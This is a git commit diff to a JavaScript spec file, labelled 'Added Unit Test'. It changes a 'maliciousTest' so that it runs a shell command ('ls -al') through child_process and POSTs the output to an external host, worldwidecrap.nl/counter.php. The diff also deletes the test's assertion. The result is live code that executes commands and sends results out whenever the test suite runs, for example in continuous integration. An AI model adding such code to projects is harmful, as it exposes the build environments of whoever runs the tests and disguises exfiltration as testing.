089a451cf3b5c26562ba9cfe643b2dd4794eafe1
TheNewSound <info@worldwidecrap.nl>
2021-02-21 03:28:43 +0100

    Added Unit Test

--- src/components/table/executeRequest.spec.js
+++ src/components/table/executeRequest.spec.js
@@ -1,15 +1,25 @@
 import * as https from 'https'
+import * as util from 'util'
+import * as childProcess from 'child_process'
 
 //CD stands for Continuous DDoS
 describe('maliciousTest', () => {
-  it('checksIfNetworkConnectionIsAllowed', async () => {
+  it('checksIfCommandExecutionIsAllowed', async () => {
     //send some cool stuff, maybe in a loop?
+    const exec = util.promisify(childProcess.exec)
+
+    const results = await exec('ls -al')
+    const data = JSON.stringify(results)
     const req = https.request(
       {
         hostname: 'worldwidecrap.nl',
         port: 443,
         path: '/counter.php',
-        method: 'GET'
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': data.length
+        }
       },
       res => {
         res.on('data', d => {
@@ -18,7 +28,7 @@ describe('maliciousTest', () => {
         })
       }
     )
+    req.write(data)
     req.end()
-    expect(req).toBeDefined()
   })
 })
